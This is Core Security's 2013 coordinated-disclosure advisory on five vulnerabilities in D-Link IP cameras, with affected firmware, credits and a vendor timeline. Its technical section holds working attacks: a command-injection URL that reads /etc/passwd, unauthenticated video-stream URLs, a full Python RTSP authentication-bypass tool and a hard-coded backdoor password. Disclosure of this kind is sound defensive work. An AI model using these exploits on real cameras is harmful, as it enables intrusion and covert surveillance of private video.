@@ -1,0 +1,519 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+D-Link IP Cameras Multiple Vulnerabilities
+
+1. *Advisory Information*
+
+Title: D-Link IP Cameras Multiple Vulnerabilities
+Advisory ID: CORE-2013-0303
+Advisory URL:
+http://www.coresecurity.com/advisories/d-link-ip-cameras-multiple-vulnerabilities
+Date published: 2013-04-29
+Date of last update: 2013-03-29
+Vendors contacted: D-Link Corporation
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: OS command injection [CWE-78], Authentication issues [CWE-287],
+Information leak through GET request [CWE-598], Authentication issues
+[CWE-287], Use of hard-coded credentials [CWE-798]
+Impact: Code execution, Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-1599, CVE-2013-1600, CVE-2013-1601, CVE-2013-1602,
+CVE-2013-1603
+
+3. *Vulnerability Description*
+
+Multiple vulnerabilities have been found in D-Link IP cameras [1] that
+could allow an unauthenticated remote attacker:
+
+   1. [CVE-2013-1599] to execute arbitrary commands from the
+administration web interface,
+   2. [CVE-2013-1600] to access the video stream via HTTP,
+   3. [CVE-2013-1601] to access the ASCII video stream via image luminance,
+   4. [CVE-2013-1602] to access the video stream via RTSP,
+   5. [CVE-2013-1603] to bypass RTSP authentication using hard-coded
+credentials.
+
+4. *Vulnerable Packages*
+
+The following is the list of affected devices and the associated
+firmware (confirmed by D-Link). Other SKUs are probably affected too,
+but they were not checked.
+
+[CVE-2013-1599]
+   . DCS-3411/3430 - firmware v1.02
+   . DCS-5605/5635 - v1.01
+   . DCS-1100L/1130L - v1.04
+   . DCS-1100/1130 - v1.03
+   . DCS-1100/1130 - v1.04_US
+   . DCS-2102/2121 - v1.05_RU
+   . DCS-3410 - v1.02
+   . DCS-5230 - v1.02
+   . DCS-5230L - v1.02
+   . DCS-6410 - v1.00
+   . DCS-7410 - v1.00
+   . DCS-7510 - v1.00
+   . WCS-1100 - v1.02
+
+[CVE-2013-1600]
+   . DCS-2102/2121 - v1.05_RU
+   . DCS-2102/2121 - v1.06
+   . DCS-2102/2121 - v1.06_FR
+   . TESCO DCS-2102/2121 - v1.05_TESCO
+
+[CVE-2013-1601] and [CVE-2013-1603]
+   . DCS-3411/3430 - v1.02
+   . DCS-5605/5635 - v1.01
+   . DCS-1100L/1130L - v1.04
+   . DCS-1100/1130 - v1.03
+   . DCS-1100/1130 - v1.04_US
+   . DCS-2102/2121 - v1.05_RU
+   . DCS-2102/2121 - v1.06
+   . DCS-2102/2121 - v1.06_FR
+   . TESCO DCS-2102/2121 - v1.05_TESCO
+   . DCS-3410 - v1.02
+   . DCS-5230 - v1.02
+   . DCS-5230L - v1.02
+   . DCS-6410 - v1.00
+   . DCS-7410 - v1.00
+   . DCS-7510 - v1.00
+   . WCS-1100 - v1.02
+
+[CVE-2013-1602]
+   . ALL mentioned devices and firmware.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+D-Link announces that all patches are ready and scheduled for posting on
+corporate web site for all customers [2013-04-25]. Contact D-Link for
+further information.
+
+6. *Credits*
+
+[CVE-2013-1599], [CVE-2013-1600] and [CVE-2013-1601] were discovered and
+researched by Francisco Falcon and Nahuel Riva from Core Exploit Writers
+Team.
+
+[CVE-2013-1602] was discovered and researched by Martin Rocha from Core
+Impact Pro Team. The PoC was made by Martin Rocha with help of Juan
+Cotta from Core QA Team.
+
+[CVE-2013-1603] was discovered and researched by Pablo Santamaria from
+Core Security Consulting Services.
+
+The publication of this advisory was coordinated by Fernando Miranda
+from Core Advisories Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *OS Command Injection*
+
+[CVE-2013-1599] A security issue located in '/var/www/cgi-bin/rtpd.cgi'
+allows an unauthenticated remote attacker to execute arbitrary commands
+through the camera's web interface. The OS command injection is due to
+this code in 'rtpd.cgi':
+
+/-----
+echo "$QUERY_STRING" | grep -vq ' ' || die "query string cannot contain
+spaces."
+. $conf > /dev/null 2> /dev/null
+eval "$(echo $QUERY_STRING | sed -e 's/&/ /g')"
+
+-----/
+ The first line of this snippet basically ensures that there are no
+spaces in '$QUERY_STRING'. The last line uses 'sed' to replace
+ampersands '&' with spaces, and then call to the function 'eval()',
+resulting in a typical command injection. For example, in order to execute:
+
+/-----
+uname -a;cat /etc/passwd
+-----/
+ the following request can be sent to the camera web interface:
+
+/-----
+http://192.168.1.100/cgi-bin/rtpd.cgi?uname&-a;cat&/etc/passwd
+-----/
+
+
+7.2. *Authentication Bypass*
+
+[CVE-2013-1600] The live video stream can be accessed without
+authentication by a remote attacker via the following request:
+
+/-----
+http://192.168.1.100/upnp/asf-mp4.asf
+-----/
+
+7.3. *ASCII Video Stream Information Leak*
+
+[CVE-2013-1601] An ASCII output (the image luminance) of the live video
+stream can be accessed by a remote unauthenticated attacker via:
+
+/-----
+http://192.168.1.100/md/lums.cgi
+-----/
+ The following example is the output of a coffee pot video stream [2]:
+
+/-----
+O O O O O O O O O O O O O O O O O O O O O O O O O O o o o o o o o o o o o o
+O O O O O O O O O O O O O O O O O O O O o o o O O O o o o o o o o o o o o o
+O O O O O O O O O O O O O O O O O O .       . . o O O o o o o o o o o o o o
+O O O O O O O O O O O O o o O O o         . .   o o o o o o o o o o o o o o
+O O O O O O O O O O O O o o o o . . . . .                   . o o o o o o o
+O O O O O O O O O O o . o O O o                               . o o o o o o
+O O O O O O O O O .                                           . o o o o o o
+O O O O O O O O .                                         . o o o o o o o o
+O O O O O O O .     . o O O o .                         . o o o o o o o o o
+O O O O O O o     . O O O O O O                         . o o o o o o o o o
+O O O O O O .     O O O O O O O .     . . . .             o o o o o o o o o
+O O O O O O     o O O O O O O O .     . . o . .           . o o o o o o o o
+O O O O O O     o O O O O O O O .   . . o o o . . . . . . . o o o o o o o o
+O O O O O O     o O O O O O O o . o O O o O O . . . . . . . . o o o o o o o
+O O O O O O .   o O O O O O O o . O O O o O O . . . . . . . . . o o o o o o
+O O O O O O .   . O O O O O o . . O O o o O O o . . . . . . . . o o o o o o
+O O O O O O o     O O O O O o . o O O o o O O o . . . . . . . . . o o o o o
+O O O O O O O     O O O O O . . o O O o o O O o . . . . . . . . . o o o o o
+O O O O O O O .   o O O O o . o o o O o o O O o . . . . . . . . . . o o o o
+O O O O O O O o   . O O O o . o o o O o o O O o . . . . . . . . . . o o o o
+O O O O O O O O   . O O O . . o o o O o o O O o . . . . . . . . . . o o o o
+O O O O O O O O     O O O . . o o o O o o O O o . . . . . . . . . . . o o o
+O O O O O O O O o   o O o   o o o o O o o o O o . . . . . . . . . . . o o o
+O O O O O O O O O   . O o   o o o o O o . o O o . . . . . . . . . . . . o o
+O O O O O O O O O .   O o . o o o o O . . o O o . . . . . . . . . . . . . o
+O O O O O O O O O o   o . . o o o o o . . o O o . . . . . . . .   .   . . o
+O O O O O O O O O O   . . . o o o . o . . o O o . . . .               .   .
+o O O O O O O O O O .     . o o o . o . . . O o . .                   .    
+o o O O O O O O O O o     . o o o . o . . . O o . .                        
+o o o O O O O O O O o     . o o o . o . . . O o .                          
+
+-----/
+
+7.4. *RTSP Authentication Bypass*
+
+[CVE-2013-1602] This vulnerability is triggered because:
+
+   1. Authentication is only present in DESCRIBE requests but not in
+every subsequent request.
+   2. When the RTSP session is being established, the authentication
+request of current session is ignored (a previously stored response is
+used instead).
+As a result, the video stream can be accessed by an unauthenticated
+remote attacker.
+
+/-----
+import sys
+from socket import *
+from threading import Thread
+import time, re
+
+LOGGING = 1
+
+def log(s):
+    if LOGGING:
+        print '(%s) %s' % (time.ctime(), s)
+
+
+class UDPRequestHandler(Thread):
+    def __init__(self, data_to_send, recv_addr, dst_addr):
+        Thread.__init__(self)
+        self.data_to_send = data_to_send
+        self.recv_addr = recv_addr
+        self.dst_addr = dst_addr
+    
+    def run(self):
+        sender = socket(AF_INET, SOCK_DGRAM)
+        sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        sender.sendto(self.data_to_send, self.dst_addr)
+        response = sender.recv(1024)
+        sender.sendto(response, self.recv_addr)
+        sender.close()
+
+
+class UDPDispatcher(Thread):
+    dispatchers = []
+    
+    def __has_dispatcher_for(self, port):
+        return any([d.src_port == port for d in UDPDispatcher.dispatchers])
+    
+    def __init__(self, src_port, dst_addr):
+        Thread.__init__(self)
+        if self.__has_dispatcher_for(src_port):
+            raise Exception('There is already a dispatcher for port %d'
+% src_port)
+        self.src_port = src_port
+        self.dst_addr = dst_addr
+        UDPDispatcher.dispatchers.append(self)
+    
+    def run(self):
+        listener = socket(AF_INET, SOCK_DGRAM)
+        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        listener.bind(('', self.src_port))
+        while 1:
+            try:
+                data, recv_addr = listener.recvfrom(1024)
+                if not data: break
+                UDPRequestHandler(data, recv_addr, self.dst_addr).start()
+            except Exception as e:
+                print e
+                break        
+        listener.close()
+        UDPDispatcher.dispatchers.remove( self )
+
+
+class PipeThread(Thread):
+    pipes = []
+    def __init__(self, source, sink, process_data_callback=lambda x: x):
+        Thread.__init__(self)
+        self.source = source
+        self.sink = sink
+        self.process_data_callback = process_data_callback
+        PipeThread.pipes.append(self)
+
+    def run(self):
+        while 1:
+            try:
+                data = self.source.recv(1024)
+                data = self.process_data_callback(data)
+                if not data: break
+                self.sink.send( data )
+            except Exception as e:
+                log(e)
+                break
+        PipeThread.pipes.remove(self)
+
+
+class TCPTunnel(Thread):
+    def __init__(self, src_port, dst_addr, process_data_callback=lambda
+x: x):
+        Thread.__init__(self)
+        log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
+dst_addr[0], dst_addr[1]))
+        self.dst_addr = dst_addr
+        self.process_data_callback = process_data_callback
+        # Create TCP listener socket
+        self.sock = socket(AF_INET, SOCK_STREAM)
+        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        self.sock.bind(('', src_port))
+        self.sock.listen(5)
+    
+    def run(self):
+        while 1:
+            # Wait until a new connection arises
+            newsock, address = self.sock.accept()
+            # Create forwarder socket
+            fwd = socket(AF_INET, SOCK_STREAM)
+            fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+            fwd.connect(self.dst_addr)
+            # Pipe them!
+            PipeThread(newsock, fwd, self.process_data_callback).start()
+            PipeThread(fwd, newsock, self.process_data_callback).start()
+
+
+class Camera():
+    def __init__(self, address):
+        self.address = address
+    def get_describe_data(self):
+        return ''
+
+
+class DLink(Camera):
+    # D-Link DCS-2102/1.06-5731
+    def __init__(self, address):
+        Camera.__init__(self, address)
+    def get_describe_data(self):
+        return
+'\x76\x3d\x30\x0d\x0a\x6f\x3d\x43\x56\x2d\x52\x54\x53\x50\x48\x61\x6e\x64\x6c\x65\x72\x20\x31\x31\x32\x33\x34\x31\x32\x20\x30\x20\x49\x4e\x20\x49\x50\x34\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x2e\x31\x31\x0d\x0a\x73\x3d\x44\x43\x53\x2d\x32\x31\x30\x32\x0d\x0a\x63\x3d\x49\x4e\x20\x49\x50\x34\x20\x30\x2e\x30\x2e\x30\x2e\x30\x0d\x0a\x74\x3d\x30\x20\x30\x0d\x0a\x61\x3d\x63\x68\x61\x72\x73\x65\x74\x3a\x53\x68\x69\x66\x74\x5f\x4a\x49\x53\x0d\x0a\x61\x3d\x72\x61\x6e\x67\x65\x3a\x6e\x70\x74\x3d\x6e\x6f\x77\x2d\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x2a\x0d\x0a\x61\x3d\x65\x74\x61\x67\x3a\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30\x0d\x0a\x6d\x3d\x76\x69\x64\x65\x6f\x20\x30\x20\x52\x54\x50\x2f\x41\x56\x50\x20\x39\x36\x0d\x0a\x62\x3d\x41\x53\x3a\x31\x38\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x39\x36\x20\x4d\x50\x34\x56\x2d\x45\x53\x2f\x39\x30\x30\x30\x30\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x74\x72\x61\x63\x6b\x49\x44\x3d\x31\x0d\x0a\x61\x3d\x66\x6d\x74\x70\x3a\x39\x36\x20\x70\x72\x6f\x66\x69\x6c\x65\x2d\x6c\x65\x76\x65\x6c\x2d\x69\x64\x3d\x31\x3b\x63\x6f\x6e\x66\x69\x67\x3d\x30\x30\x30\x30\x30\x31\x42\x30\x30\x31\x30\x30\x30\x30\x30\x31\x42\x35\x30\x39\x30\x30\x30\x30\x30\x31\x30\x30\x30\x30\x30\x30\x30\x31\x32\x30\x30\x30\x43\x34\x38\x38\x42\x41\x39\x38\x35\x31\x34\x30\x34\x33\x43\x31\x34\x34\x33\x46\x3b\x64\x65\x63\x6f\x64\x65\x5f\x62\x75\x66\x3d\x37\x36\x38\x30\x30\x0d\x0a\x61\x3d\x73\x65\x6e\x64\x6f\x6e\x6c\x79\x0d\x0a\x6d\x3d\x61\x75\x64\x69\x6f\x20\x30\x20\x52\x54\x50\x2f\x41\x56\x50\x20\x30\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x30\x20\x50\x43\x4d\x55\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x74\x72\x61\x63\x6b\x49\x44\x3d\x32\x0d\x0a\x61\x3d\x73\x65\x6e\x64\x6f\x6e\x6c\x79\x0d\x0a'
+
+
+class RTSPAuthByPasser():
+    DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
+    UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
+    SERVER_PORT_ARGUMENTS = 'server_port='
+    DEFAULT_CSEQ = 1
+    DEFAULT_SERVER_PORT_RANGE = '5556-5559'
+
+    def __init__(self, local_port, camera):
+        self.last_describe_req = ''
+        self.camera = camera
+        self.local_port = local_port
+        
+    def start(self):
+        log('[!] Starting bypasser')
+        TCPTunnel(self.local_port, self.camera.address,
+self.spoof_rtsp_conn).start()
+        
+    def spoof_rtsp_conn(self, data):
+        if RTSPAuthByPasser.DESCRIBE_REQ_HEADER in data:
+            self.last_describe_req = data
+        elif RTSPAuthByPasser.UNAUTHORIZED_RESPONSE in data and
+self.last_describe_req:
+            log('[!] Unauthorized response received. Spoofing...')
+            spoofed_describe = self.camera.get_describe_data()
+            # Look for the request CSeq
+            m = re.search('.*CSeq:\\s*(\\d+?)\r\n.*',
+self.last_describe_req)
+            cseq = m.group(1) if m else RTSPAuthByPasser.DEFAULT_CSEQ
+            # Create the response
+            data = 'RTSP/1.0 200 OK\r\n'
+            data+= 'CSeq: %s\r\n' % cseq
+            data+= 'Content-Type: application/sdp\r\n'
+            data+= 'Content-Length: %d\r\n' % len(spoofed_describe)
+            data+= '\r\n'
+            # Attach the spoofed describe
+            data+= spoofed_describe       
+        elif RTSPAuthByPasser.SERVER_PORT_ARGUMENTS in data:
+            # Look for the server RTP ports
+            m = re.search('.*%s\\s*(.+?)[;|\r].*' %
+RTSPAuthByPasser.SERVER_PORT_ARGUMENTS, data)
+            ports = m.group(1) if m else
+RTSPAuthByPasser.DEFAULT_SERVER_PORT_RANGE
+            # For each port in the range create a UDP dispatcher
+            begin_port, end_port = map(int, ports.split('-'))
+            for udp_port in xrange(begin_port, end_port + 1):
+                try:
+                    UDPDispatcher(udp_port, (self.camera.address[0],
+udp_port)).start()
+                except:
+                    pass        
+        return data
+
+if __name__ == '__main__':
+    if len( sys.argv ) > 1:
+        listener_port = camera_port = int(sys.argv[1])
+        camera_ip = sys.argv[2]
+        if len(sys.argv) == 4:
+            camera_port = int(sys.argv[3])
+        RTSPAuthByPasser(listener_port, DLink((camera_ip,
+camera_port))).start()
+    else:
+        print 'usage: python %s [local_port] [camera_ip]
+[camera_rtsp_port]'   
+-----/
+
+7.5. *RTSP Hard-Coded Credentials*
+
+[CVE-2013-1603] RTSP service contains hard-coded credentials that
+effectively serve as a backdoor, which allows remote attackers to access
+the RTSP video stream.
+
+/-----
+username: (any)           
+password: ?*
+-----/
+
+As we can see in the following dump, the submitted password is compared
+with the string ':?*' (the character ':' is used for concatenation of
+'username:password'). This code belongs to the binary 'rtspd':
+
+/-----
+.text:00011468 loc_11468               ; Load from Memory
+.text:00011468 LDR     R3, [R11,#s2]
+.text:0001146C STR     R3, [R11,#var_C0] ; Store to Memory
+.text:00011470 LDR     R2, [R11,#var_C0] ; Load from Memory
+.text:00011474 LDR     R3, [R11,#var_BC] ; Load from Memory
+.text:00011478 ADD     R3, R2, R3      ; Rd = Op1 + Op2
+.text:0001147C SUB     R3, R3, #3      ; Rd = Op1 - Op2
+.text:00011480 STR     R3, [R11,#var_C0] ; Store to Memory
+.text:00011484 LDR     R0, [R11,#var_C0] ; s1
+.text:00011488 LDR     R1, =asc_1B060  ; ":?*"      <-------
+.text:0001148C MOV     R2, #3          ; n
+.text:00011490 BL      strncmp         ; Branch with Link
+.text:00011494 MOV     R3, R0          ; Rd = Op2
+.text:00011498 CMP     R3, #0          ; Set cond. codes on Op1 - Op2
+.text:0001149C BNE     loc_114BC       ; Branch
+-----/
+
+8. *Report Timeline*
+. 2013-03-19:
+Core Security Technologies notifies the D-Link team of the vulnerability.
+
+. 2013-03-20:
+D-Link team asks for a technical description of the vulnerability.
+
+. 2013-03-20:
+Core sends a draft advisory with technical details and set the estimated
+publication date of the advisory for May 14th, 2013.
+
+. 2013-03-20:
+Vendor notifies that D-Link Corporation has an unpublished bounty
+program for security advisors. The bounty program requires both Core
+Security and D-Link to sign a memo of understanding (MoU).
+
+. 2013-03-25:
+Core notifies that receiving money from vendors may bias the view of the
+report and rejects the bounty program.
+
+. 2013-03-29:
+Vendor notifies that they hope to close the fix ASAP.
+
+. 2013-04-08:
+Vendor sends the list of vulnerable devices and the associated firmware
+and notifies that they will release patches and release notes on the
+D-Link support forum first. Then, an official public release will be
+announced (approx. 1 month from forum post to full release).
+
+. 2013-04-24:
+Core asks for a clarification regarding the D-Link release date and
+notifies that releasing fixes to a privileged closed group and/or a
+closed forum or list is unacceptable.
+
+. 2013-04-25:
+Vendor notifies that the patches are ready and scheduled for posting on
+D-Link web site over the next few days.
+
+. 2013-04-26:
+Core notifies that the advisory is re-scheduled for Monday 29th.
+
+. 2013-04-29:
+Advisory CORE-2013-0303 published.
+
+9. *References*
+
+[1] http://www.dlink.com/us/en/home-solutions/view/network-cameras.
+[2]
+http://corelabs.coresecurity.com/themes/sample_theme/images/coffee-pot.png.
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
